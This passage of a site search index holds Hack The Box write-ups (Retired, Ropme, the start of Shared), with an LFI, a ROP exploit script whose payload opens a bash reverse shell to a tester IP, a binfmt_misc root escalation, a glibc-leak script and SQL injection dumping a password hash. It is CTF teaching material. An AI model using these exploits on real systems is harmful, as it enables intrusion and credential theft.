authority\\system\n</code></pre>"},{"location":"HackTheBox/Retired/","title":"Retired","text":""},{"location":"HackTheBox/Retired/#nmap","title":"Nmap","text":"<p>As always the first step is to enumerate all the services to get an idea of what we can do:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap 10.10.11.154 -p- --min-rate 1000\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:58 EDT\nNmap scan report for 10.10.11.154\nHost is up (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 18.65 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap 10.10.11.154 -sC -sV                \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 13:59 EDT\nNmap scan report for 10.10.11.154\nHost is up (0.052s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)\n| ssh-hostkey: \n|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)\n|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)\n|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)\n80/tcp open  http    nginx\n| http-title: Agency - Start Bootstrap Theme\n|_Requested resource was /index.php?page=default.html\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.65 seconds\n</code></pre> <p>Only 2 services running and one of them is SSH, since the version is pretty recent we will just start with the Nginx service and see if we can go on from there.</p>"},{"location":"HackTheBox/Retired/#port-80","title":"Port 80","text":"<p>The web page is pretty basic and is not really offering much functionality (Not good for us) but I noticed something in the URL: <code>http://10.10.11.154/index.php?page=default.html</code>.</p> <p>Looks like that <code>index.php</code> is including files in order to show the page. Trying to use something like <code>../../../../../../etc/passwd</code> does not work but I was able to retrieve the <code>index.php</code> file itself:</p> <pre><code># http://10.10.11.154/index.php?page=index.php\n\n&lt;?php\nfunction sanitize_input($param) {\n    $param1 = str_replace(\"../\",\"\",$param);\n    $param2 = str_replace(\"./\",\"\",$param1);\n    return $param2;\n}\n\n$page = $_GET['page'];\nif (isset($page) &amp;&amp; preg_match(\"/^[a-z]/\", $page)) {\n    $page = sanitize_input($page);\n} else {\n    header('Location: /index.php?page=default.html');\n}\n\nreadfile($page);\n?&gt;\n</code></pre> <p>The code is sanitizing the <code>page</code> parameter and that is what was messing me up earlier. The thing is that it is a custom function and it is not covering all the possibilities so using the <code>file://</code> protocol is enough to get LFI:</p> <pre><code># http://10.10.11.154/index.php?page=file:///etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:105::/nonexistent:/usr/sbin/nologin\n_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nvagrant:x:1000:1000::/vagrant:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndev:x:1001:1001::/home/dev:/bin/bash\n</code></pre> <p>Also, since the <code>readfile</code> function also accept a URL to a remote server RCI is possible too.</p>"},{"location":"HackTheBox/Retired/#fuzzing-to-search-for-more-pages","title":"Fuzzing to search for more pages","text":"<p>Just one thing, at this point this LFI/RCI thing is cool but not much to do with it so maybe there are more pages in the site? Let's fuzz the page parameter a bit:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --hw 0 http://10.10.11.154/index.php?page=FUZZ.html \n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://10.10.11.154/index.php?page=FUZZ.html\nTotal requests: 207643\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                             \n=====================================================================\n\n000000040:   200        188 L    824 W      11414 Ch    \"default\"                                                                                           \n000000885:   200        72 L     304 W      4144 Ch     \"beta\"\n\nTotal time: 692.0576\nProcessed Requests: 134823\nFiltered Requests: 134821\nRequests/sec.: 194.8146\n</code></pre> <p>That <code>beta.html</code> page looks like a form to upload some kind of license key to the server to get access to the beta program. The form issue a POST request to <code>activate_license.php</code>. Time to check that file using the LFI we already have:</p> <pre><code># http://10.10.11.154/index.php?page=activate_license.php\n\n&lt;?php\nif(isset($_FILES['licensefile'])) {\n    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);\n    $license_size = $_FILES['licensefile']['size'];\n\n    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n    if (!$socket) { echo \"error socket_create()\\n\"; }\n\n    if (!socket_connect($socket, '127.0.0.1', 1337)) {\n        echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\";\n    }\n\n    socket_write($socket, pack(\"N\", $license_size));\n    socket_write($socket, $license);\n\n    socket_shutdown($socket);\n    socket_close($socket);\n}\n?&gt;\n</code></pre> <p>So... looks like something is listenning in the server and is responsible of processing the license uploaded. Maybe the description in the form about a 512 bit key is a hint about a likely buffer overflow.</p>"},{"location":"HackTheBox/Retired/#leaking-processes","title":"Leaking processes","text":"<p>Since we know there are something listenning in the server for licenses to validate let's try to find it. Using the LFI and a little python script it is possible to leak the running processes:</p> <pre><code>import requests\n\ntarget_ip = '10.10.11.154'\n\nprint(\"Leaking processes running...\")\nfor pid in range(10000):\n    payload = f'file:///proc/{pid}/cmdline'\n    url = f'http://{target_ip}/index.php?page={payload}'\n    response = requests.get(url)\n    if(response.text):\n        print(f'PID {pid} --&gt; {response.text}')\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ python3 leak_program.py\nLeaking processes running...\nPID 417 --&gt; /usr/bin/activate_license1337\nPID 578 --&gt; nginx: worker process\nPID 579 --&gt; nginx: worker process\nPID 585 --&gt; php-fpm: pool www\n</code></pre> <p>That <code>/usr/bin/activate_license1337</code> looks promising. Since we know that it is binded to port 1337, the numerical part is just an argument so the binary is <code>/usr/bin/activate_license</code>. Time to download it!</p> <p>We can get the binary encoded as a base64 using: <pre><code>http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license1337\n</code></pre> After getting the string, we can just copy and decode in a file to get the actual binary.</p>"},{"location":"HackTheBox/Retired/#reversing-time-and-rce","title":"Reversing time and RCE!","text":"<p>Using Ghidra to check a bit how the binary is built, I found that it is vulnerable to buffer overflow. In the function <code>activate_license</code> there is a 512 bytes long buffer that it is used to hold the data sent from the web server, a 4 bytes number representing the information size added by the <code>activate_license.php</code> file and the license key entered in the form. The thing is that, when extracting this information from the socket and copying it to the buffer, the program does not check that the content of the socket fits the inside the buffer.</p> <p>It is now time to write our exploit, this part really took me a long time of try and error. The idea is to use ROP to spawn a reverse shell, normally making the program spawns a shell is enough... but not in this case, we don't have access to the <code>activate_license</code> service itself.</p> <p>First of all, the binary has all the protections on:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Retired]\n\u2514\u2500$ checksec activate_license\n[*] '/home/kali/Documents/HTB/Retired/activate_license'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n</code></pre> <p>Since PIE and ASLR are enabled, the binary, external libraries, stack... are allocated randomly when the binary is executed. The thing is that, even though the base addresses change, the offsets from the base address to any part of the library or binary are always the same.</p> <p>In order to bypass the protections, we need to somehow leak information about the base addresses of the binary in memory and also the loaded libraries. Locally, the way to do this is going to the <code>/proc</code> folder, search the folder with the PID name of the process and checking the file called <code>maps</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/proc/5712]\n\u2514\u2500$ cat maps       \n55a4af3a5000-55a4af3a6000 r--p 00000000 08:01 3715345                    /home/kali/Documents/HTB/Retired/activate_license\n55a4af3a6000-55a4af3a7000 r-xp 00001000 08:01 3715345                    /home/kali/Documents/HTB/Retired/activate_license\n...\n7fcd3ca34000-7fcd3ca5a000 r--p 00000000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n7fcd3ca5a000-7fcd3cba2000 r-xp 00026000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n7fcd3cba2000-7fcd3cbed000 r--p 0016e000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n7fcd3cbed000-7fcd3cbee000 ---p 001b9000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n7fcd3cbee000-7fcd3cbf1000 r--p 001b9000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n7fcd3cbf1000-7fcd3cbf4000 rw-p 001bc000 08:01 801158                     /usr/lib/x86_64-linux-gnu/libc-2.33.so\n...\n7ffe7dd76000-7ffe7dd97000 rw-p 00000000 00:00 0                          [stack]\n7ffe7ddf5000-7ffe7ddf9000 r--p 00000000 00:00 0                          [vvar]\n7ffe7ddf9000-7ffe7ddfb000 r-xp 00000000 00:00 0                          [vdso]\n</code></pre> <p>Obviously, this information is useless in the remote machine but we have LFI in the box web server so it is possible to do this same thing for it. I wrote a little Python script that first locate the process PID and then prints the memory information of the process:</p> <pre><code>import requests\n\ntarget_ip = '10.10.11.154'\n\nprint('Leaking process, running...')\n\npid = 0\nfor guess_pid in range(400, 10000):\n    payload = f'file:///proc/{guess_pid}/cmdline'\n    url = f'http://{target_ip}/index.php?page={payload}'\n    response = requests.get(url)\n    if(response.text and 'license' in response.text):\n        pid = guess_pid\n        print(f'PID {pid} --&gt; {response.text}')\n        break\n\nprint('Getting base addresses...')\nresponse = requests.get(f'http://{target_ip}/index.php?page=file:///proc/{pid}/maps')\nprint(response.text)\n</code></pre> <p>The script also leaked the location of the Glibc library in the system. I decided to download it to make sure I get the offset to the <code>system</code> function right. Using Radare is easy to get the offset to the <code>system</code> function: <code>0x000000048e50</code>.</p> <p>Next step is to find a <code>pop rdi</code> gadget to move the <code>system</code> function first parameter to the <code>rdi</code> register, that is how the first parameter is managed in 64 bits. A gadget is just an instruction followed by the <code>ret</code> instruction, in this case Radare reported that in the offset <code>0x00000000181b</code> of the binary we have what we want.</p> <p>Only one thing left, the command to execute. Normally the string <code>/bin/sh</code> located in the Glibc is used but, as said before, that trick is useless here. The string we need is something like this: <code>/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.78/8000 0&gt;&amp;1\"\\x00</code> to get a reverse shell, notice the null character at the end to mark the end of the string. In order to use that string we need to inject it in the stack as part of our payload. The problem of this approach is that, even though we know the base address of the stack, the position of the stack information vary a bit between executions so we don't really know where our argument will be.</p> <p>After some time, I gave up trying to get exact the exact position of the stack injected parameter using ROP strings and I ended up using a bit of brute force. Since we know where the stack starts and ends it is possible, this is the final exploit:</p> <pre><code>#! /usr/bin/env python3\n\nfrom pwn import *\nimport requests\n\n# Gather info\n\ncontext.binary = './activate_license'\ntarget_ip = '10.10.11.154'\nurl = f'http://{target_ip}/activate_license.php'\n\n# Information from the LFI\nsystem_got_offset = 0x000000048e50\npop_rdi_offset = 0x00000000181b\npid = 452\nprogram_base = 0x562d2c7d5000\nlibc_base = 0x7f3772531000\nstack_limits = [0x7ffc4cd8b000, 0x7ffc4cdac000]\nstack_range = stack_limits[1] - stack_limits[0]\n\nsystem_got_address = libc_base + system_got_offset\npop_rdi_address = program_base + pop_rdi_offset\n\nprint(f'Process PID ---&gt; {pid}')\nprint(f'Binary base ---&gt; {hex(program_base)}')\nprint(f'Libc base ---&gt; {hex(libc_base)}')\nprint(f'Stack range ---&gt; {stack_range}')\n\nprint(f'Pop rdi address ---&gt; {hex(pop_rdi_address)}')\nprint(f'System address in GOT ---&gt; {hex(system_got_address)}')\n\n\n# Exploit part\n\ncommand_to_execute = b'/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.78/8000 0&gt;&amp;1\"\\x00'\n\nwith log.progress('Brute forcing stack, not fancy but works...') as p:\n    # Based on some tests I did, the injected string is normally in the last part of the stack addresses\n    for offset in range(stack_range - 9000, stack_range):\n        p.status(f\"Offset --&gt; {offset}/{stack_range}\")\n        # Prepare payload\n        with open(\"test.txt\", \"wb\") as file_to_upload:\n            junk = b'A' * 520 # 4 bytes less than expected to compensate the php file processing\n            payload = p64(pop_rdi_address) + p64(stack_limits[0] + offset) + p64(system_got_address) + command_to_execute\n            program_input = junk + payload\n            file_to_upload.write(program_input)\n\n        # Send payload\n        with open('test.txt','rb') as file_to_upload:\n            files={'licensefile': file_to_upload}\n            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5'}\n            response = requests.post(url,files=files, headers=headers)\n</code></pre> <p>Not fancy but after some time waiting I got a reverse shell in my Netcat listener! We are now in the box, what a ride.</p>"},{"location":"HackTheBox/Retired/#in-the-machine","title":"In the machine","text":""},{"location":"HackTheBox/Retired/#getting-user","title":"Getting user","text":"<p>Looks like there is some kind of cron job making backups of the <code>html</code> folder running as the <code>dev</code> user. The zip files this cronjob creates are owned by <code>dev</code> but the group is <code>www-data</code> so we can read them, what about creating a soft link to the dev user home directory inside the <code>html</code> folder?</p> <p>Looks like the idea worked! The full <code>dev</code> user home folder is copied and now we can access it. I will take the <code>dev</code> user private key to get a more reliable SSH session, the user flag is under:</p> <pre><code>/home/dev/user.txt\n</code></pre>"},{"location":"HackTheBox/Retired/#privesc","title":"Privesc","text":"<p>Inside the <code>dev</code> folder we can find the Emumu source code. Also, the program is installed and has registered something called \"valid roms\" to execute with Emumu.</p> <p>According to the Makefile, the <code>reg_helper</code> binary has the <code>cap_dac_override</code> capability set: <pre><code>CC := gcc\nCFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion\n\nSOURCES := $(wildcard *.c)\nTARGETS := $(SOURCES:.c=)\n\n.PHONY: install clean\n\ninstall: $(TARGETS)\n    @echo \"[+] Installing program files\"\n    install --mode 0755 emuemu /usr/bin/\n    mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d\n    install --mode 0750 --group dev reg_helper /usr/lib/emuemu/\n    setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper\n\n    @echo \"[+] Register OSTRICH ROMs for execution with EMUEMU\"\n    echo ':EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:' \\\n        | tee /usr/lib/binfmt.d/emuemu.conf \\\n        | /usr/lib/emuemu/reg_helper\n\nclean:\n    rm -f -- $(TARGETS)\n</code></pre></p> <p>This should allow this binary to bypass permissions check in the file system without <code>root</code>. Looks like the objective of this file is to just register a new binary type, in this case the Emuemu roms, to the kernel. More information</p> <p>According to the string used: <code>:EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:</code>, when the system try to execute a file that has <code>\\x13\\x37OSTRICH\\x00ROM\\x00</code> as magic bits it will pass the file as first argument to <code>/usr/bin/emuemu</code> and execute that instead. We can execute the installed binary <code>/usr/lib/emuemu/reg_helper</code> to add new associations, remember that the binary has the <code>cap_dac_override</code> capability so no need of <code>root</code> privileges.</p> <p>My idea here is to create an association that will execute a SUID binary like <code>/usr/bin/newgrp</code> through a malicious interpreter. According to the documentation adding the flag <code>C</code> to the association configuration string will execute the interpreter as <code>root</code> in case of a SUID binary, this is called a shadow SUID.</p> <p>Using a hexadecimal editor, I took the first 52 bytes of the <code>/usr/bin/newgrp</code> binary and used them as the byte sequence my association is matching for. Why 52 bytes? Well I took all the bytes needed to find difference between <code>/usr/bin/newgrp</code> and the other binaries to avoid matching all of them.</p> <p>Only one  thing left, creating the interpreter and the association:</p> <pre><code>// Compiled with gcc mal.c -o mal\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void) {\n    // Even though the interpreter runs as root the effective UID used is from the user running the binary. This makes sure the effective UID is what we want\n    setuid(0);\n    setgid(0);\n\n    system(\"/bin/bash -p\");\n    return 1;\n}\n</code></pre> <pre><code>echo ':MAL:M::\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\xd0\\x47::/home/dev/emuemu/mal:C' | /usr/lib/emuemu/reg_helper\n</code></pre> <p>Everything is ready, when we execute the <code>newgrp</code> binary a root shell is spawned as expected!</p> <pre><code>dev@retired:~/emuemu$ newgrp \nroot@retired:~/emuemu#\n</code></pre> <p>The <code>root</code> flag is under:</p> <pre><code>/root/root.txt\n</code></pre>"},{"location":"HackTheBox/Ropme/","title":"Ropme","text":""},{"location":"HackTheBox/Ropme/#enumeration","title":"Enumeration","text":"<p>Let's start checking the security of the binary:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Ropme]\n\u2514\u2500$ checksec ropme\n[*] '/home/kali/Desktop/HTB/Ropme/ropme'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n</code></pre> <p>Even though PIE is disabled, ASLR is enabled to protect the addresses of libraries like <code>glibc</code>. Also NX is enabled so we can't execute shellcode in the stack. RELRO is partial, what means, we could modify the Global Offset Table (GOT) which allow the dynamic linker to load and link symbols. When a shared function is called, the GOT will point to the PLT where the dynamic linker is used to find the location of a certain function. Once the location is found, the address is saved in the GOT (Like a cache).</p> <p>Time to spin up Ghidra and check the binary code:</p> <pre><code>undefined8 main(void)\n\n{\n  char local_48 [64];\n\n  puts(\"ROP me outside, how \\'about dah?\");\n  fflush(stdout);\n  fgets(local_48,500,stdin);\n  return 0;\n}\n</code></pre> <p>As you can see, the program is vulnerable to buffer overflow because the <code>fgets</code> function receives 500 characters but the buffer only has 64 characters. I couldn't find something inside the binary to get a flag so taking into account the binary security we saw earlier... I guess we could try to execute a <code>glibc</code> function to be able to execute a shell.</p> <p>We need to use a technique called ROP (Return Oriented Programming). The idea is to overflow the return address in a stack frame with the address of functions or gadgets that are in memory and start jumping from one to another. The objective is to get information about the location of functions in <code>glibc</code>, we know that the base location of the library is random but the offsets between functions remain always the same so if we can leak the address of one single function we can get the rest. This way we can try to execute the <code>system</code> function with <code>/bin/sh</code> as parameter (In 32 bits the function parameters go in the stack but in 64 bits they are in registers).</p>"},{"location":"HackTheBox/Ropme/#address-leak","title":"Address leak","text":""},{"location":"HackTheBox/Ropme/#getting-some-extra-data","title":"Getting some extra data","text":"<p>First we need to leak a function address, we can use the <code>puts</code> function to print the address to the screen but we will need to pass the address as a parameter.</p> <p>In our case we have a 64 binary so we have to manipulate the <code>rdi</code> register (The first argument is stored there) to control the parameter of the <code>puts</code> function. To do this, we have to find gadgets in the binary to do this for us, using radare we can find what we need to move data from the stack to the <code>rdi</code> register:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Ropme]\n\u2514\u2500$ r2 ./ropme\n[0x00400530]&gt; /R | grep 'pop rdi'\n  0x004006d3                 5f  pop rdi\n</code></pre> <p>Cool, now is time to get the parameter for our <code>puts</code> function, a <code>glibc</code> function address, and also the location of the <code>puts</code> call, we need to call it. Since we already have to check some information of the <code>puts</code> function we can also choose it to leak its address:</p> <p><pre><code>[0x00400530]&gt; pdf@sym.imp.puts\n            ; CALL XREF from main @ 0x40063a\n\u250c 6: int sym.imp.puts (const char *s);\n\u2502 bp: 0 (vars 0, args 0)\n\u2502 sp: 0 (vars 0, args 0)\n\u2502 rg: 0 (vars 0, args 0)\n\u2514           0x004004e0      ff25320b2000   jmp qword [reloc.puts]      ; [0x601018:8]=0x4004e6\n</code></pre> From this output we need the location of the <code>puts</code> call: <code>0x004004e0</code> and also the GOT entry address: <code>0x601018</code>.</p> <p>Finally we need to get the <code>main</code> function entrypoint because we want to force the program to restart once we leak the <code>puts</code> address:</p> <p><pre><code>[0x00400530]&gt; afl | grep main\n0x004004f0    1 6            sym.imp.__libc_start_main\n0x00400626    1 71           main\n</code></pre> The address for the <code>main</code> function is <code>0x00400626</code></p>"},{"location":"HackTheBox/Ropme/#leak-time","title":"Leak time!","text":"<p>I wrote this script to be able to leak the address we need:</p> <pre><code>#! /usr/bin/env python3\n\nfrom pwn import *\nimport argparse\n\n# Prepare env\n\nparser = argparse.ArgumentParser(description='Pwn Ropme')\nparser.add_argument('--remote', '-r', action='store_true')\nargs = parser.parse_args()\n\ncontext.binary = './ropme'\nif(args.remote):\n  process = remote('&lt;MACHINE_IP&gt;', &lt;MACHINE_PORT&gt;)\nelse:\n  process = process('./ropme')\n\n# Start exploit\n\nwith log.progress('Leaking puts@glibc...') as p:\n  junk = b'A' * 72\n  pop_rdi = p64(0x4006d3) # Return address overwrite to move whatever pointed by RSP\n  got_put = p64(0x601018) # Parameter pointed by RSP (Top of the stack), is the puts entry in the GOT table \n  put_call = p64(0x4004e0) # Return of pop call to execute puts with our parameter\n  main_call = p64(0x400626) # Return to main softly to continue exploting with the address we got\n  payload = junk + pop_rdi + got_put + put_call + main_call\n\n  process.recvline('ROP me outside, how \\'about dah?')\n  process.sendline(payload)\n  data = process.recvline()\n\n  leaked_puts_raw = data.strip().ljust(8, b'\\x00') # Make sure we have a 64 bits address (Adding missing 0s)\n  leaked_puts = hex(u64(leaked_puts_raw))\n  p.success(leaked_puts)\n\nprocess.close()\n</code></pre> <p>It is prepared to be able to launch the attack against the local and the remote binary (You need the binary locally to configure the exploit context). One possible output for the remote (Remember that ASLR is enabled):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Ropme]\n\u2514\u2500$ ./test.py --remote\n[*] '/home/kali/Desktop/HTB/Ropme/ropme'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Opening connection to &lt;MACHINE_IP&gt; on port &lt;MACHINE_PORT&gt;: Done\n[+] Leaking puts@glibc...: 0x7fd8602c0690\n[*] Closed connection to &lt;MACHINE_IP&gt; port &lt;MACHINE_PORT&gt;\n</code></pre>"},{"location":"HackTheBox/Ropme/#exploit-time","title":"Exploit time!","text":"<p>Now we need to know what is the <code>glibc</code> version of the server. Using https://libc.rip/, we can enter the leaked memory address and the symbol's name: <code>puts</code> to get what we want:</p> <pre><code>libc6_2.23-0ubuntu11_amd64\nlibc6_2.23-0ubuntu6_amd64\nlibc6_2.23-0ubuntu9_amd64\nlibc6_2.23-0ubuntu10_amd64\nlibc6_2.23-0ubuntu5_amd64\nlibc6_2.23-0ubuntu4_amd64\nlibc6_2.23-0ubuntu7_amd64\nlibc6_2.13-0ubuntu4_amd64\nlibc6_2.13-0ubuntu15_amd64\n</code></pre> <p>Clicking in the versions we can check the base address of the <code>puts</code> symbol: <code>0x6f690</code>, also we can get the addreses for <code>system</code>: <code>0x45390</code> and the <code>/bin/sh</code> string as <code>str_bin_sh</code>: <code>0x18cd17</code> (I needed some try and error for this last one).</p> <p>With all this information, we can add to our previous exploit a new section where, instead of executing the <code>puts</code> version to leak an address, we can execute the <code>system</code> function with <code>/bin/sh</code> as parameter. To get any <code>glibc</code> address, we have to first get the library offset: <code>puts_leaked_address - puts_base_address</code> and then we can just get any address doing: <code>function_base_address + offset</code>. I included as resource the complete Python script I used to exploit the binary: </p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Ropme]\n\u2514\u2500$ ./pwn_ropme --remote\n[*] '/home/kali/Desktop/HTB/Ropme/ropme'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Opening connection to &lt;MACHINE_IP&gt; on port &lt;MACHINE_PORT&gt;: Done\n[+] Leaking puts@glibc...: 0x7f64d9eab690\n[+] Getting a shell...: Done\n[*] Switching to interactive mode\nls\nflag.txt\nropme\nspawn.sh\n</code></pre> <p>If you try my Python script to exploit the binary locally and it fails, you will need to check your system <code>glibc</code> version and modify the script a bit.</p>"},{"location":"HackTheBox/Shared/","title":"Shared","text":""},{"location":"HackTheBox/Shared/#nmap","title":"Nmap","text":"<p>Time to start with out typical Nmap scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.172           \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 11:30 EDT\nNmap scan report for 10.10.11.172\nHost is up (0.054s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nNmap done: 1 IP address (1 host up) scanned in 26.27 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p22,80,443 10.10.11.172\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 11:31 EDT\nNmap scan report for 10.10.11.172\nHost is up (0.055s latency).\n\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)\n|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)\n|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)\n80/tcp  open  http     nginx 1.18.0\n|_http-server-header: nginx/1.18.0\n|_http-title: Did not follow redirect to http://shared.htb\n443/tcp open  ssl/http nginx 1.18.0\n|_http-title: Did not follow redirect to https://shared.htb\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|   h2\n|_  http/1.1\n|_http-server-header: nginx/1.18.0\n| tls-nextprotoneg: \n|   h2\n|_  http/1.1\n| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US\n| Not valid before: 2022-03-20T13:37:14\n|_Not valid after:  2042-03-15T13:37:14\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.42 seconds\n</code></pre> <p>I will focus in the website for now, looks like both ports are hosting the same application and redirecting to HTTPS.</p>"},{"location":"HackTheBox/Shared/#web-application","title":"Web Application","text":"<p>According to a cookie name I saw this looks like a Prestashop application. I tested the page a bit and trying to buy something I found what looks like a virtual host: <code>checkout.shared.htb</code>. The checkout page was pretty useless and not doing nothing really.</p> <p>At this point I will run both a directory scan and a virtual host scan. After a while, I did not find anything worth mentioning. The only thing is that I found where to create a client account and that the API in <code>/api</code> was disabled. Luckily, I saw something interesting in the <code>checkout.shared.htb</code> application.</p> <p>The cookie used to load the cart information into the checkout page has this format:</p> <pre><code>{\"PRODUCT_ID\":\"QUANTITY\"}\n</code></pre> <p>I tried to edit the product ID and I noticed that it is SQL injectable with something like:</p> <pre><code>{\"HI' UNION SELECT 1,(SELECT group_concat(0x7c,schema_name,0x7c) from information_schema.schemata),3 -- - \":\"1\"}\n</code></pre> <p>That returned the name of the existing databases. From there, I wrote a little Python script to allow me to query the database easily and after a while I found a username and a password:</p> <pre><code>SELECT group_concat(0x7c,schema_name,0x7c) from information_schema.schemata\n|information_schema|,|checkout|\n\nSELECT group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema='checkout'\n|user|,|product|\n\nSELECT group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name='user'\n|id|,|username|,|password|\n\nselect group_concat(0x7c,username,0x7c,0x7c,password,0x7c) from user\n|james_mason||fc895d4eddc2fc12f995e18c865cf273|\n</code></pre> <p>That looks like a MD5 hash so using the Rockyou dictionary and Jhon I cracked it:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shared]\n\u2514\u2500$ john --format=raw-md5 